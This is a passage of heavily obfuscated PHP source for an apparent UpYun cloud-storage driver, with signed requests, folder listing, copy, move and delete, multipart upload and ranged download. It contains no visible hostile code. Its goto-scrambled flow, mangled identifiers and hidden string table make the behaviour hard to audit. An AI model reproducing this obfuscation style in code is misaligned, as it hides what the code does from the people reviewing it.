"{$bÌÉ¬ò›÷ü}\46{$c≥˘ø”Ö‰á}\x26{$cˆèå…Âÿπ}", md5("{$this->userpass}"), !0)); $dÆé±àŒñÖ = array("\x41\x75\164\x68\x6f\162\x69\172\x61\164\x69\x6f\x6e\x3a\125\120\x59\x55\116\40{$this->username}\72{$C∆éÌ≠ π◊}", "\x44\x61\x74\x65\x3a{$cˆèå…Âÿπ}"); return $dÆé±àŒñÖ; } public function ussRequest($a˘”Ö‰û°û, $f´√«ÿëëî = "\107\105\x54", $eÃñƒ⁄÷»∆ = false, $DÜ—⁄◊ï˘ı = false, $B©Ÿ©ò‡Ãƒ = false) { goto fº“ÛıÑ–ô; dûÿ⁄òçÊ–: if (!$bæëﬂ¡–≤ù) { return array($fƒ‰Ã¢É“–[1086] => !1, $fƒ‰Ã¢É“–[1088] => $fƒ‰Ã¢É“–[1332]); } if (strtolower($f´√«ÿëëî) == $fƒ‰Ã¢É“–[190] || in_array($bæëﬂ¡–≤ù[$fƒ‰Ã¢É“–[1086]], array($fƒ‰Ã¢É“–[1189], $fƒ‰Ã¢É“–[1333]))) { $eÃñƒ⁄÷»∆ = $bæëﬂ¡–≤ù[$fƒ‰Ã¢É“–[1334]]; } else { $eÃñƒ⁄÷»∆ = json_decode($bæëﬂ¡–≤ù[$fƒ‰Ã¢É“–[1088]], !0); if (!$eÃñƒ⁄÷»∆) { $eÃñƒ⁄÷»∆ = $bæëﬂ¡–≤ù[$fƒ‰Ã¢É“–[1088]]; } else { if (!$bæëﬂ¡–≤ù[$fƒ‰Ã¢É“–[710]] && isset($eÃñƒ⁄÷»∆[$fƒ‰Ã¢É“–[1335]])) { $eÃñƒ⁄÷»∆ = $eÃñƒ⁄÷»∆[$fƒ‰Ã¢É“–[1335]]; } } } return array($fƒ‰Ã¢É“–[1086] => $bæëﬂ¡–≤ù[$fƒ‰Ã¢É“–[710]], $fƒ‰Ã¢É“–[1088] => $eÃñƒ⁄÷»∆); goto F¶‹è´ªñ∂; Eëçœº¿≥É: $aå˘Ô¯Úµá = $this->ussHeaders($B™ç¨‚≥“ì, $f´√«ÿëëî); if ($DÜ—⁄◊ï˘ı) { $aå˘Ô¯Úµá = array_merge($aå˘Ô¯Úµá, $DÜ—⁄◊ï˘ı); } $bæëﬂ¡–≤ù = url_request($this->endpoint . $B™ç¨‚≥“ì, $f´√«ÿëëî, $eÃñƒ⁄÷»∆, $aå˘Ô¯Úµá, $B©Ÿ©ò‡Ãƒ); goto dûÿ⁄òçÊ–; fº“ÛıÑ–ô: $fƒ‰Ã¢É“– =& $_SERVER[ú∫]; $a˘”Ö‰û°û = trim($a˘”Ö‰û°û, $fƒ‰Ã¢É“–[8]); $B™ç¨‚≥“ì = "\x2f{$this->bucket}\x2f{$a˘”Ö‰û°û}"; goto Eëçœº¿≥É; F¶‹è´ªñ∂: } public function mkfile($BÇ¢÷ÒÃÈì, $e¨ç∑ÿÉ∂Œ = '', $Céä®∑∏Úπ = REPEAT_RENAME) { if ($this->setContent($BÇ¢÷ÒÃÈì, $e¨ç∑ÿÉ∂Œ)) { return $this->getPathOuter($BÇ¢÷ÒÃÈì); } return !1; } public function mkdir($B”ôÍ∂á˜Ù, $DÀÁÑù“·Ã = REPEAT_SKIP) { $cÎ’–∞—ÖÔ =& $_SERVER[ú∫]; $céµŒÖÉÜ‹ = trim($B”ôÍ∂á˜Ù, $cÎ’–∞—ÖÔ[8]); if ($this->_isFolder($céµŒÖÉÜ‹)) { return $this->getPathOuter($céµŒÖÉÜ‹); } $dÑıö—√«⁄ = array($cÎ’–∞—ÖÔ[1336]); $eûªêÒ≤◊Ò = $this->ussRequest($céµŒÖÉÜ‹, $cÎ’–∞—ÖÔ[224], !1, $dÑıö—√«⁄); return $eûªêÒ≤◊Ò[$cÎ’–∞—ÖÔ[1086]] ? $this->getPathOuter($céµŒÖÉÜ‹) : !1; } public function copyFile($Bü™ëèüû€, $câ†¿ÖÂ√±) { $dƒâÜÏ†Âè =& $_SERVER[ú∫]; $c‹‰ÚÁ¶Ì” = array($dƒâÜÏ†Âè[1337] . "\57{$this->bucket}\x2f{$Bü™ëèüû€}", $dƒâÜÏ†Âè[1338]); $d¬–¥∑ÇŸØ = $this->ussRequest($câ†¿ÖÂ√±, $dƒâÜÏ†Âè[226], !1, $c‹‰ÚÁ¶Ì”); return $d¬–¥∑ÇŸØ[$dƒâÜÏ†Âè[1086]] ? !0 : $this->getPathOuter($câ†¿ÖÂ√±); } public function moveFile($d ïÖ”∆–Ñ, $AæÂèÑêﬁÿ) { $cìﬂáÂ‹Ë =& $_SERVER[ú∫]; $BÇ≠ÏµÈùä = array($cìﬂáÂ‹Ë[1339] . "\x2f{$this->bucket}\57{$d ïÖ”∆–Ñ}", $cìﬂáÂ‹Ë[1338]); $f≥Â≠Â∑‚± = $this->ussRequest($AæÂèÑêﬁÿ, $cìﬂáÂ‹Ë[226], !1, $BÇ≠ÏµÈùä); return $f≥Â≠Â∑‚±[$cìﬂáÂ‹Ë[1086]] ? !0 : $this->getPathOuter($AæÂèÑêﬁÿ); } public function delFile($EèéÂËæú–) { $AÁŸÌéº¡∞ =& $_SERVER[ú∫]; $A®ãî˘Ç†◊ = $this->ussRequest($EèéÂËæú–, $AÁŸÌéº¡∞[1340]); return $A®ãî˘Ç†◊[$AÁŸÌéº¡∞[1086]] ? !0 : !1; } public function delFolder($b¬ˆΩ¶ÚØƒ) { goto B©∏¯›àÉÑ; F≈í§ö±á∂: $AŸ√Œóæã = $cÇŒÌ‰“¶È = array(); $this->fileList($b¬ˆΩ¶ÚØƒ, $AŸ√Œóæã, $cÇŒÌ‰“¶È, !0); $this->listItemCache = !0; goto céí∑Ï⁄≤©; B©∏¯›àÉÑ: $bÓÖﬁãŒ¨ﬂ =& $_SERVER[ú∫]; if (!$this->exist($b¬ˆΩ¶ÚØƒ)) { return !0; } $this->listItemCache = !1; goto F≈í§ö±á∂; céí∑Ï⁄≤©: foreach ($cÇŒÌ‰“¶È as $Eú‘˘Öå») { $F‹”Ê¬®Ø¿ = $this->ussRequest($Eú‘˘Öå»[$bÓÖﬁãŒ¨ﬂ[28]], $bÓÖﬁãŒ¨ﬂ[1340]); if (!$F‹”Ê¬®Ø¿[$bÓÖﬁãŒ¨ﬂ[1086]]) { return !1; } } foreach ($AŸ√Œóæã as $bªÿü ÏÊê) { $F‹”Ê¬®Ø¿ = $this->ussRequest($bªÿü ÏÊê, $bÓÖﬁãŒ¨ﬂ[1340]); if (!$F‹”Ê¬®Ø¿[$bÓÖﬁãŒ¨ﬂ[1086]]) { return !1; } } $F‹”Ê¬®Ø¿ = $this->ussRequest($b¬ˆΩ¶ÚØƒ, $bÓÖﬁãŒ¨ﬂ[1340]); goto fÛ∫â∞•≠Ê; fÛ∫â∞•≠Ê: return $F‹”Ê¬®Ø¿[$bÓÖﬁãŒ¨ﬂ[1086]]; goto eèﬂ€¶≥†‚; eèﬂ€¶≥†‚: } public function rename($d€◊ûèÜ“∑, $d«ö‹â¬ùﬂ) { if ($this->isFile($d€◊ûèÜ“∑)) { $d«ö‹â¬ùﬂ = get_path_father($d€◊ûèÜ“∑) . $d«ö‹â¬ùﬂ; return $this->moveFile($d€◊ûèÜ“∑, $d«ö‹â¬ùﬂ); } return $this->renameObject($d€◊ûèÜ“∑, $d«ö‹â¬ùﬂ); } public function fileInfo($A±í≥¡ûÕ–, $C≈Ø·ä‰õß = false, $c“√ñπö◊ˆ = array()) { goto bü´„À—ﬂä; bü´„À—ﬂä: $aïÀÚÛ—Ü„ =& $_SERVER[ú∫]; $F“Ωò∑É‹» = array($aïÀÚÛ—Ü„[28] => $this->pathThis($A±í≥¡ûÕ–), $aïÀÚÛ—Ü„[76] => $this->getPathOuter($aïÀÚÛ—Ü„[8] . $A±í≥¡ûÕ–), $aïÀÚÛ—Ü„[29] => $aïÀÚÛ—Ü„[193], $aïÀÚÛ—Ü„[78] => isset($c“√ñπö◊ˆ[$aïÀÚÛ—Ü„[78]]) ? $c“√ñπö◊ˆ[$aïÀÚÛ—Ü„[78]] : 0, $aïÀÚÛ—Ü„[168] => $this->ext($A±í≥¡ûÕ–)); if ($C≈Ø·ä‰õß) { return $F“Ωò∑É‹»; } goto cê·á¯¿÷Ã; b–°†Ø€˜ê: $F“Ωò∑É‹»[$aïÀÚÛ—Ü„[194]] = intval($c“√ñπö◊ˆ[$aïÀÚÛ—Ü„[1341]]); $F“Ωò∑É‹»[$aïÀÚÛ—Ü„[84]] = intval($c“√ñπö◊ˆ[$aïÀÚÛ—Ü„[1342]]); $F“Ωò∑É‹»[$aïÀÚÛ—Ü„[78]] = $c“√ñπö◊ˆ[$aïÀÚÛ—Ü„[78]]; goto FéÉ⁄∑“≠´; FéÉ⁄∑“≠´: return $F“Ωò∑É‹»; goto aÊæº⁄ﬁÓÖ; cê·á¯¿÷Ã: $F“Ωò∑É‹»[$aïÀÚÛ—Ü„[194]] = $F“Ωò∑É‹»[$aïÀÚÛ—Ü„[84]] = 0; $F“Ωò∑É‹»[$aïÀÚÛ—Ü„[195]] = $F“Ωò∑É‹»[$aïÀÚÛ—Ü„[196]] = !0; if (empty($c“√ñπö◊ˆ)) { $c“√ñπö◊ˆ = $this->objectMeta($A±í≥¡ûÕ–); if (!$c“√ñπö◊ˆ) { return $F“Ωò∑É‹»; } } goto b–°†Ø€˜ê; aÊæº⁄ﬁÓÖ: } public function folderInfo($d±áÇ¡çÆÆ, $bÛë£â”˜◊ = false) { goto b¬—ßîØù; e’∫áàΩÊ§: $eÜÍ£ê—ç‹[$dìç≥ºÈ≤õ[194]] = $eÜÍ£ê—ç‹[$dìç≥ºÈ≤õ[84]] = 0; $eÜÍ£ê—ç‹[$dìç≥ºÈ≤õ[195]] = $eÜÍ£ê—ç‹[$dìç≥ºÈ≤õ[196]] = !0; if (empty($eÖû›ôÆÌ°)) { $eÖû›ôÆÌ° = $this->objectMeta($d±áÇ¡çÆÆ); if (!$eÖû›ôÆÌ°) { return $eÜÍ£ê—ç‹; } } goto EÃøäø˜çœ; b¬—ßîØù: $dìç≥ºÈ≤õ =& $_SERVER[ú∫]; $eÜÍ£ê—ç‹ = array($dìç≥ºÈ≤õ[28] => $this->pathThis($d±áÇ¡çÆÆ), $dìç≥ºÈ≤õ[76] => $this->getPathOuter($dìç≥ºÈ≤õ[8] . $d±áÇ¡çÆÆ), $dìç≥ºÈ≤õ[29] => $dìç≥ºÈ≤õ[77]); if ($bÛë£â”˜◊) { return $eÜÍ£ê—ç‹; } goto e’∫áàΩÊ§; EÃøäø˜çœ: $eÜÍ£ê—ç‹[$dìç≥ºÈ≤õ[194]] = intval($eÖû›ôÆÌ°[$dìç≥ºÈ≤õ[1341]]); $eÜÍ£ê—ç‹[$dìç≥ºÈ≤õ[84]] = intval($eÖû›ôÆÌ°[$dìç≥ºÈ≤õ[1342]]); return $eÜÍ£ê—ç‹; goto Béåö¿˘«À; Béåö¿˘«À: } private function listObjs($d¬ú§ﬂ˘Ûë, $Dıè€Ìˆæï = 0, $eç»§î∑‚Ω = 1000) { $B’˜¥œóÍ¥ =& $_SERVER[ú∫]; $a’ùéè§óﬁ = array($B’˜¥œóÍ¥[1343], $B’˜¥œóÍ¥[1344] . $eç»§î∑‚Ω); if ($Dıè€Ìˆæï) { $a’ùéè§óﬁ[] = $B’˜¥œóÍ¥[1345] . $Dıè€Ìˆæï; } $Fù§Ïß≠öó = $this->ussRequest($d¬ú§ﬂ˘Ûë, $B’˜¥œóÍ¥[228], !1, $a’ùéè§óﬁ); return !$Fù§Ïß≠öó[$B’˜¥œóÍ¥[1086]] ? !1 : $Fù§Ïß≠öó[$B’˜¥œóÍ¥[1088]]; } private function fileList($aÙ≤Ó„Àâ•, &$bÛú é˘¬ß, &$FøåçÖ÷ ›, $e˜Ô¨√Î±á = false) { goto d»Ω»⁄¬ Æ; d»Ω»⁄¬ Æ: $e≥≤Üü„¡£ =& $_SERVER[ú∫]; $f¶Õ‡ıàÔ‡ = $e≥≤Üü„¡£[33]; $FÕ‹è®ÍûË = 1000; goto FùÌ√∑ß¿“; FùÌ√∑ß¿“: $c¨¢‰èÜ∏ê = rtrim($aÙ≤Ó„Àâ•, $e≥≤Üü„¡£[8]) . $e≥≤Üü„¡£[8]; $c‘ìﬂ—∆å¡ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $C’ç∆Ç‰Ãì = $this->listObjs($aÙ≤Ó„Àâ•, $f¶Õ‡ıàÔ‡, $FÕ‹è®ÍûË); if (!$C’ç∆Ç‰Ãì) { return !1; } $f¶Õ‡ıàÔ‡ = isset($C’ç∆Ç‰Ãì[$e≥≤Üü„¡£[1346]]) ? $C’ç∆Ç‰Ãì[$e≥≤Üü„¡£[1346]] : $e≥≤Üü„¡£[33]; $dÜÃ˜¨Æ‘ç = isset($C’ç∆Ç‰Ãì[$e≥≤Üü„¡£[1347]]) ? $C’ç∆Ç‰Ãì[$e≥≤Üü„¡£[1347]] : array(); foreach ($dÜÃ˜¨Æ‘ç as $a≠¿ŸÕ¿Õ√) { $cÈ‡º≥âçõ = $a≠¿ŸÕ¿Õ√[$e≥≤Üü„¡£[29]] == $e≥≤Üü„¡£[77] ? !0 : !1; $FﬂıÆΩ√Èô = ltrim($c¨¢‰èÜ∏ê . $a≠¿ŸÕ¿Õ√[$e≥≤Üü„¡£[28]], $e≥≤Üü„¡£[8]) . ($cÈ‡º≥âçõ ? $e≥≤Üü„¡£[8] : $e≥≤Üü„¡£[33]); $Cë‚÷ΩƒÏ‹ = array($e≥≤Üü„¡£[28] => $FﬂıÆΩ√Èô, $e≥≤Üü„¡£[29] => $cÈ‡º≥âçõ ? $e≥≤Üü„¡£[77] : $e≥≤Üü„¡£[193], $e≥≤Üü„¡£[78] => $a≠¿ŸÕ¿Õ√[$e≥≤Üü„¡£[335]], $e≥≤Üü„¡£[1342] => $a≠¿ŸÕ¿Õ√[$e≥≤Üü„¡£[1348]]); if ($c‘ìﬂ—∆å¡) { $this->cacheMethod($e≥≤Üü„¡£[199], $FﬂıÆΩ√Èô, $cÈ‡º≥âçõ); $this->cacheMethod($e≥≤Üü„¡£[200], $FﬂıÆΩ√Èô, $Cë‚÷ΩƒÏ‹); } if ($cÈ‡º≥âçõ) { $bÛú é˘¬ß[] = $FﬂıÆΩ√Èô; if ($e˜Ô¨√Î±á) { $this->fileList($FﬂıÆΩ√Èô, $bÛú é˘¬ß, $FøåçÖ÷ ›, $e˜Ô¨√Î±á); } continue; } $FøåçÖ÷ ›[] = $Cë‚÷ΩƒÏ‹; } if (count($dÜÃ˜¨Æ‘ç) < $FÕ‹è®ÍûË) { break; } } goto Bô∏¢å»Ÿ¨; Bô∏¢å»Ÿ¨: if ($c‘ìﬂ—∆å¡) { $this->cacheMethod($e≥≤Üü„¡£[199], $aÙ≤Ó„Àâ•, !0); } goto d±ì†íÒ§‚; d±ì†íÒ§‚: } public function listPath($fè‹ô´õì, $AÆÉöÈÃ◊◊ = false) { $fº∞¡•÷Óà =& $_SERVER[ú∫]; $E≠›πòÑÈÇ = $e˘˘Ü¨’Ò’ = array(); $this->fileList($fè‹ô´õì, $E≠›πòÑÈÇ, $e˘˘Ü¨’Ò’); foreach ($E≠›πòÑÈÇ as $eá∑Èëâ†ë => $aô£Ççˆ≥í) { $E≠›πòÑÈÇ[$eá∑Èëâ†ë] = $this->folderInfo($aô£Ççˆ≥í, $AÆÉöÈÃ◊◊); } foreach ($e˘˘Ü¨’Ò’ as $eá∑Èëâ†ë => $aô£Ççˆ≥í) { $e˘˘Ü¨’Ò’[$eá∑Èëâ†ë] = $this->fileInfo($aô£Ççˆ≥í[$fº∞¡•÷Óà[28]], $AÆÉöÈÃ◊◊, $aô£Ççˆ≥í); } return array($fº∞¡•÷Óà[75] => $E≠›πòÑÈÇ, $fº∞¡•÷Óà[74] => $e˘˘Ü¨’Ò’); } public function has($dÊµˆœ„£ó, $a‘ıÇ¡å£´ = false, $DŸú¨˘ä¯á = true) { goto e¡°Ï¬‹»·; f’¬ÇÓÉôÂ: $DÉø∏ñö¡© = 0; $Dÿœ™®¶∏é = 0; $aá¬§≈ŒŸÏ = rtrim($dÊµˆœ„£ó, $E‚Û‰ª”òÖ[8]) . $E‚Û‰ª”òÖ[8]; goto F†î’à¯¿å; F†î’à¯¿å: while (!0) { check_abort(); $B‚‰úßä¥ó = $this->listObjs($dÊµˆœ„£ó, $C£ÖÜ„ŸÀµ, $eå‰ñÇ§∞¬); if (!$B‚‰úßä¥ó) { return !1; } $C£ÖÜ„ŸÀµ = isset($B‚‰úßä¥ó[$E‚Û‰ª”òÖ[1346]]) ? $B‚‰úßä¥ó[$E‚Û‰ª”òÖ[1346]] : $E‚Û‰ª”òÖ[33]; $D‰⁄ÒêØáÈ = isset($B‚‰úßä¥ó[$E‚Û‰ª”òÖ[1347]]) ? $B‚‰úßä¥ó[$E‚Û‰ª”òÖ[1347]] : array(); if (empty($D‰⁄ÒêØáÈ)) { break; } $aπ€æºéŒë = array_filter($D‰⁄ÒêØáÈ, function ($Bª”ÒÏêÀ) { $båäéŒºôÊ =& $_SERVER[ú∫]; return $Bª”ÒÏêÀ[$båäéŒºôÊ[29]] == $båäéŒºôÊ[77]; }); $e · ó÷˜© = count($D‰⁄ÒêØáÈ); $aπ€æºéŒë = count($aπ€æºéŒë); $d‘¡Û≠ê›π = $e · ó÷˜© - $aπ€æºéŒë; if ($a‘ıÇ¡å£´) { $Dÿœ™®¶∏é += $aπ€æºéŒë; $DÉø∏ñö¡© += $d‘¡Û≠ê›π; if ($e · ó÷˜© < $eå‰ñÇ§∞¬) { break; } continue; } if ($DŸú¨˘ä¯á) { if ($d‘¡Û≠ê›π) { return !0; } } else { if ($aπ€æºéŒë) { return !0; } } if ($e · ó÷˜© < $eå‰ñÇ§∞¬) { break; } } if ($a‘ıÇ¡å£´) { return array($E‚Û‰ª”òÖ[203] => $DÉø∏ñö¡©, $E‚Û‰ª”òÖ[204] => $Dÿœ™®¶∏é); } return !1; goto c≤Ù˘Á”Ãø; e¡°Ï¬‹»·: $E‚Û‰ª”òÖ =& $_SERVER[ú∫]; $C£ÖÜ„ŸÀµ = $E‚Û‰ª”òÖ[33]; $eå‰ñÇ§∞¬ = 500; goto f’¬ÇÓÉôÂ; c≤Ù˘Á”Ãø: } public function listAll($dÊ’ı“åÖ⁄) { goto AøËò∞ç∂ƒ; AøËò∞ç∂ƒ: $EáπÃ‰‡Ãá =& $_SERVER[ú∫]; $Eå±–üáçò = $BúÍëÌöÁâ = array(); $this->fileList($dÊ’ı“åÖ⁄, $Eå±–üáçò, $BúÍëÌöÁâ, !0); goto aÖ‚âëåúº; aÖ‚âëåúº: $eÒ´†ΩôˆØ = array(); foreach ($BúÍëÌöÁâ as $BäéΩ™•≠π) { $eÒ´†ΩôˆØ[$BäéΩ™•≠π[$EáπÃ‰‡Ãá[28]]] = $BäéΩ™•≠π[$EáπÃ‰‡Ãá[78]]; } foreach ($Eå±–üáçò as $BäéΩ™•≠π) { if (is_string($BäéΩ™•≠π)) { $eÒ´†ΩôˆØ[$BäéΩ™•≠π] = 0; } } goto E±¯êé‰ù·; E±¯êé‰ù·: return $this->listAllFiles($dÊ’ı“åÖ⁄, array_keys($eÒ´†ΩôˆØ), $eÒ´†ΩôˆØ); goto díÃ„û¡è‹; díÃ„û¡è‹: } public function canRead($fáùì˜É£) { return $this->exist($fáùì˜É£) ? !0 : !1; } public function canWrite($C º°Ωå¿Ë) { return $this->exist($C º°Ωå¿Ë) ? !0 : !1; } public function getContent($aàÖÈëŸä¬) { return $this->fileSubstr($aàÖÈëŸä¬, 0, -1); } public function setContent($D≥ÜŸïÇôØ, $a…œ≥√®©∏ = '') { $aÆõïÂ‰ö≈ =& $_SERVER[ú∫]; if (!$a…œ≥√®©∏) { $bíÿ«Íí©„ = $this->ussRequest($D≥ÜŸïÇôØ, $aÆõïÂ‰ö≈[224]); return $bíÿ«Íí©„[$aÆõïÂ‰ö≈[1086]]; } $DøŒåâœŒ‚ = $this->tempFile($this->pathThis($D≥ÜŸïÇôØ)); file_put_contents($DøŒåâœŒ‚, $a…œ≥√®©∏); if ($this->upload($D≥ÜŸïÇôØ, $DøŒåâœŒ‚)) { $this->tempFileRemve($DøŒåâœŒ‚); return !0; } return !1; } public function fileSubstr($a‘†≥∑ÑÀ„, $aòôÔåçòÇ, $Fñ¡ÆòÇ≥ï) { $D¯™“„⁄µû =& $_SERVER[ú∫]; if (!($FÏ¨ππ—Óπ = $this->link($a‘†≥∑ÑÀ„))) { return !1; } $a—Ì“Ò‡Ç• = !1; if ($Fñ¡ÆòÇ≥ï > 0) { $AåŒå˘¿◊˘ = $aòôÔåçòÇ + $Fñ¡ÆòÇ≥ï - 1; $a—Ì“Ò‡Ç• = array($D¯™“„⁄µû[1309] . $aòôÔåçòÇ . $D¯™“„⁄µû[440] . $AåŒå˘¿◊˘); } $fúª„Õäåé = url_request($FÏ¨ππ—Óπ, $D¯™“„⁄µû[228], !1, $a—Ì“Ò‡Ç•); return $fúª„Õäåé[$D¯™“„⁄µû[710]] ? $fúª„Õäåé[$D¯™“„⁄µû[1088]] : !1; } public function upload($DÜéß≠ê¯∏, $B‰ü∫†ÇÛ», $cõæ¬ÃöõÕ = false, $bè˜æ∏‘°« = REPEAT_REPLACE) { goto bÔÉòÃÊæ‹; bÔÉòÃÊæ‹: $b±› ·Ïı≤ =& $_SERVER[ú∫]; $e≠°Ü»çÎ = IO::size($B‰ü∫†ÇÛ»); if ($e≠°Ü»çÎ <= 1024 * 1024 * 200) { $EÜª»Ë¿‡¯ = array($b±› ·Ïı≤[1349] . $B‰ü∫†ÇÛ»); $F˘»…®€¿ﬁ = $this->ussRequest($DÜéß≠ê¯∏, $b±› ·Ïı≤[226], $EÜª»Ë¿‡¯); return $F˘»…®€¿ﬁ[$b±› ·Ïı≤[1086]] ? $this->getPathOuter($DÜéß≠ê¯∏) : !1; } goto f‹Û’…∂ü∑; f‹Û’…∂ü∑: $c„È™«®ﬁ† = 1024 * 1024 * 10; $A◊ãø«´—µ = array($b±› ·Ïı≤[1350], $b±› ·Ïı≤[1351] . $e≠°Ü»çÎ, $b±› ·Ïı≤[1352], $b±› ·Ïı≤[1353] . $c„È™«®ﬁ†); $F˘»…®€¿ﬁ = $this->ussRequest($DÜéß≠ê¯∏, $b±› ·Ïı≤[226], !1, $A◊ãø«´—µ); goto eõ»◊◊„¨ƒ; fñﬂá⁄Í±Ç: $F˘»…®€¿ﬁ = $this->ussRequest($DÜéß≠ê¯∏, $b±› ·Ïı≤[226], !1, $A◊ãø«´—µ); return $F˘»…®€¿ﬁ[$b±› ·Ïı≤[1086]] ? $this->getPathOuter($F€Ü˘∆Ø≤û) : !1; goto e€€àêö∂π; CàâÜ§Í·¨: do { $cºßïäﬁëß = $A≥Üˆ€∂§∫[$b±› ·Ïı≤[1355]]; fseek_64($aèãàﬂüá–, $EÖ⁄ﬁä—ë®); $EÈ¶„∏ôÉø = fread($aèãàﬂüá–, $cºßïäﬁëß); $Fá≠≤¿Ω≠⁄ = 0; do { $Fá≠≤¿Ω≠⁄++; $A≥Üˆ€∂§∫ = $this->uploadPart($DÜéß≠ê¯∏, $A≥Üˆ€∂§∫, $EÈ¶„∏ôÉø); } while (!$A≥Üˆ€∂§∫ && $Fá≠≤¿Ω≠⁄ < 3); if (!$A≥Üˆ€∂§∫) { return !1; } $bË‡»ù»≤Ü = $A≥Üˆ€∂§∫[$b±› ·Ïı≤[1354]]; $EÖ⁄ﬁä—ë® += $cºßïäﬁëß; } while ($bË‡»ù»≤Ü != -1); fclose($aèãàﬂüá–); $A◊ãø«´—µ = array($b±› ·Ïı≤[1356], $b±› ·Ïı≤[1357] . $A≥Üˆ€∂§∫[$b±› ·Ïı≤[1358]], $b±› ·Ïı≤[1352]); goto fñﬂá⁄Í±Ç; eõ»◊◊„¨ƒ: if (!$F˘»…®€¿ﬁ[$b±› ·Ïı≤[1086]]) { return !1; } $A≥Üˆ€∂§∫ = $F˘»…®€¿ﬁ[$b±› ·Ïı≤[1088]]; $EÖ⁄ﬁä—ë® = 0; goto eÎ—⁄±âò; eÎ—⁄±âò: $bË‡»ù»≤Ü = $A≥Üˆ€∂§∫[$b±› ·Ïı≤[1354]]; $aèãàﬂüá– = fopen($B‰ü∫†ÇÛ», $b±› ·Ïı≤[1259]); if (!$aèãàﬂüá–) { return !1; } goto CàâÜ§Í·¨; e€€àêö∂π: } private function uploadPart($FîëËÿºÓò, $dÿûÛàª“≠, &$cÙÿñı©è…) { $a°ãç˜Œ¥ =& $_SERVER[ú∫]; $E ìì£ŒÈà = array($a°ãç˜Œ¥[1359], $a°ãç˜Œ¥[1357] . $dÿûÛàª“≠[$a°ãç˜Œ¥[1358]], $a°ãç˜Œ¥[1360] . $dÿûÛàª“≠[$a°ãç˜Œ¥[1354]], $a°ãç˜Œ¥[141] . $dÿûÛàª“≠[$a°ãç˜Œ¥[1355]]); $Dæûì¬Ñã¬ = $this->ussRequest($FîëËÿºÓò, $a°ãç˜Œ¥[226], $cÙÿñı©è…, $E ìì£ŒÈà); return !$Dæûì¬Ñã¬[$a°ãç˜Œ¥[1086]] ? $Dæûì¬Ñã¬[$a°ãç˜Œ¥[1086]] : $Dæûì¬Ñã¬[$a°ãç˜Œ¥[1088]]; } public function uploadFormData($D·Ëê·≤æ≤, $EõâàøÔ˜Ø = 3600) { return $this->uploadPolicy($D·Ëê·≤æ≤, $EõâàøÔ˜Ø); } public function multiUploadFormData($DÜ≤õæÑ™ê, $DÕﬁπòÚÃ¬ = 3600) { $céæ◊ÉøÙÊ =& $_SERVER[ú∫]; $dêà©˘¶…¯ = (int) $GLOBALS[$céæ◊ÉøÙÊ[7]][$céæ◊ÉøÙÊ[78]]; return $this->uploadPolicy($DÜ≤õæÑ™ê, $DÕﬁπòÚÃ¬, $dêà©˘¶…¯); } private function uploadPolicy($fàôÙÃôîŒ, $EŒ†ÆÇê» = 3600, $FõîÒ∆ŸëΩ = 0) { goto b∆——ËÔâ´; DâÃ®©ƒÑ: $f®∫øî»à´ = array($Eµ‘èªáª¡[1361] => $this->bucket, $Eµ‘èªáª¡[1362] => $fàôÙÃôîŒ, $Eµ‘èªáª¡[1363] => time() + $EŒ†ÆÇê», $Eµ‘èªáª¡[1364] => $Cﬂ∫≈î¥ï∫); if ($FõîÒ∆ŸëΩ) { $f®∫øî»à´[$Eµ‘èªáª¡[1275]] = $FõîÒ∆ŸëΩ; } $d≠ªÌÏüû“ = base64_encode(json_encode($f®∫øî»à´)); goto cû◊‘∏ÛπÑ; cû◊‘∏ÛπÑ: $CÎÇçêÉƒ‡ = base64_encode(hash_hmac($Eµ‘èªáª¡[1331], "\120\117\x53\124\46{$f›õéÛ†„¿}\x26{$Cﬂ∫≈î¥ï∫}\46{$d≠ªÌÏüû“}", md5("{$this->userpass}"), !0)); $E¶¡ƒèüÔ¡ = array($Eµ‘èªáª¡[1201] => $d≠ªÌÏüû“, $Eµ‘èªáª¡[1365] => "\x55\120\131\x55\x4e\x20{$this->username}\x3a{$CÎÇçêÉƒ‡}", $Eµ‘èªáª¡[175] => $this->endpoint . $f›õéÛ†„¿); return $E¶¡ƒèüÔ¡; goto C¯ÃîÁ‰âÜ; b∆——ËÔâ´: $Eµ‘èªáª¡ =& $_SERVER[ú∫]; $f›õéÛ†„¿ = $Eµ‘èªáª¡[8] . $this->bucket; $Cﬂ∫≈î¥ï∫ = gmdate($Eµ‘èªáª¡[1296]); goto DâÃ®©ƒÑ; C¯ÃîÁ‰âÜ: } public function download($AµıµôÌö–, $E∞öœ™™ÎÜ) { goto d¶ãÃôù¢¶; a¯ê…’≈‰ö: fclose($a∏ÙÁÙ≠Û§); return $E∞öœ™™ÎÜ; goto bª÷ÙøÙÏ«; BüΩâ „˜ﬁ: $DÊﬂò¬Âãö = 1024 * 200; $a∏ÙÁÙ≠Û§ = fopen($C°∏ª‡ˆè€, $_SERVER[ú∫][1315]); while (!0) { $CÃ®≥Ú“Öª = $this->fileSubstr($AµıµôÌö–, $AÈœîÕâ∆ä, $DÊﬂò¬Âãö); if ($CÃ®≥Ú“Öª === !1) { return !1; } fwrite($a∏ÙÁÙ≠Û§, $CÃ®≥Ú“Öª); $AÈœîÕâ∆ä += $DÊﬂò¬Âãö; if (strlen($CÃ®≥Ú“Öª) < $DÊﬂò¬Âãö) { break; } } goto a¯ê…’≈‰ö; d¶ãÃôù¢¶: $C°∏ª‡ˆè€ = IO::getPathInner(IO::mkfile($E∞öœ™™ÎÜ)); if (!($Dº∆‘¡ó‹ù = $this->link($AµıµôÌö–))) { return !1; } $AÈœîÕâ∆ä = 0; goto BüΩâ „˜ﬁ; bª÷ÙøÙÏ«: } public function link($d∑Ωò“—Ñô, $Aíë≤Çï™ù = array()) { $Bê∂≤àˆ˘¡ =& $_SERVER[ú∫]; $d∑Ωò“—Ñô = trim($d∑Ωò“—Ñô, $Bê∂≤àˆ˘¡[8]); if (!empty($this->token)) { $D€çˆª£∆ù = strtotime(date($Bê∂≤àˆ˘¡[1366])); $B‡≥‰»ê´ò = substr(md5($this->token . $Bê∂≤àˆ˘¡[282] . $D€çˆª£∆ù . $Bê∂≤àˆ˘¡[1367] . $d∑Ωò“—Ñô), 12, 8) . $D€çˆª£∆ù; $Aíë≤Çï™ù[] = $Bê∂≤àˆ˘¡[1368] . $B‡≥‰»ê´ò; } $bÒ–≈µïóœ = !empty($Aíë≤Çï™ù) ? $Bê∂≤àˆ˘¡[70] . implode($Bê∂≤àˆ˘¡[282], $Aíë≤Çï™ù) : $Bê∂≤àˆ˘¡[33]; return $this->getHost() . $Bê∂≤àˆ˘¡[8] . $d∑Ωò“—Ñô . 